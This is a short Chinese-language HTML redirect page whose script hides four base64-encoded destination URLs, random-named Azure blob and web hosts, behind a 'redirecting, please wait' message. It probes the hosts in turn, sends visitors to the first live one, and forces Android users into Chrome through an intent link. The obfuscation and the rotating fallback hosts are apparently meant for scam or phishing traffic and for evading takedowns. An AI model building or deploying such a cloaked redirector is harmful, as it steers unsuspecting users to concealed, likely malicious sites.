<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>跳转中...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      background: #f4f4f4;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #333;
    }
    .message {
      text-align: center;
      display: none;
    }
    .fail {
      color: #c00;
    }
  </style>
</head>
<body>
  <div class="message" id="loadingMsg">正在跳转，请稍候...</div>
  <div class="message fail" id="failMsg">项目维护中，请稍后再试。</div>

  <script>
    // base64 编码的 URL 列表（加密）
    const encodedUrls = [
      "aHR0cHM6Ly9pd3RxMjVkaHIuYmxvYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA==",
      "aHR0cHM6Ly9meDRpdWc1cXNwLmJsb2IuY29yZS53aW5kb3dzLm5ldC9ob21lL2luZGV4Lmh0bWw=",
      "aHR0cHM6Ly9oamRrYzg3MzFtaXcuYmxvYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA==",
      "aHR0cHM6Ly94OTN5djJjYWs1dzguejQ4LndlYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA=="
    ];

    const isAndroid = /android/i.test(navigator.userAgent);
    const loadingMsg = document.getElementById("loadingMsg");
    const failMsg = document.getElementById("failMsg");

    loadingMsg.style.display = "block";

    let redirected = false;

    function base64Decode(str) {
      try {
        return atob(str);
      } catch (e) {
        return null;
      }
    }

    function tryNext(index) {
      if (index >= encodedUrls.length) {
        loadingMsg.style.display = "none";
        failMsg.style.display = "block";
        return;
      }

      const url = base64Decode(encodedUrls[index]);
      if (!url) return tryNext(index + 1);

      const img = new Image();
      img.onload = () => {
        if (redirected) return;
        redirected = true;

        if (isAndroid) {
          // Android 强制跳转 Chrome 浏览器
          window.location.href = `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
        } else {
          window.location.href = url;
        }
      };
      img.onerror = () => tryNext(index + 1);
      img.src = url + "?ping=" + Date.now();
    }

    setTimeout(() => tryNext(0), 300);
  </script>
</body>
</html>
